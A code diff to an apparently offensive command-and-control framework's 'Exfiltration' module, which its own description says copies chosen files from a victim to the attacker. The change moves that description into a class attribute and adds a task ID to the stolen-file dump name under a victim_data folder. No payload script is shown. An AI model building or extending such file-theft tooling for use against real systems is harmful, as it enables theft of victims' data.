@@ -9,6 +9,8 @@ sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../..
 from module import Module
 
 class Exfiltration(Module):
+	description = 'This module downloads the specified files on victim to the attacker'
+
 	@classmethod
 	def module_options(cls):
 		h = {
@@ -19,12 +21,11 @@ class Exfiltration(Module):
 
 	def __init__(self,name,utility,language,options):
 
-		description = 'This module downloads the specified files on victim to the attacker'
 		## We are loading the script in the script variable here
-		super(Exfiltration, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")(options))    
+		super(Exfiltration, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    
 
 	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
-	def handle_task_output(self,data,options,victim_id):
+	def handle_task_output(self,data,options,victim_id, task_id):
 
 		## Default Dumping path
 		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)
@@ -32,7 +33,7 @@ class Exfiltration(Module):
 		if not os.path.exists(dump_path):
 			os.makedirs(dump_path)
 
-		filename = f"{os.path.basename(options['location'])}.zip"
+		filename = f"{os.path.basename(options['location'])}_{task_id}.zip"
 		filepath = os.path.join(dump_path,filename)
 
 		if 'path' in  options:
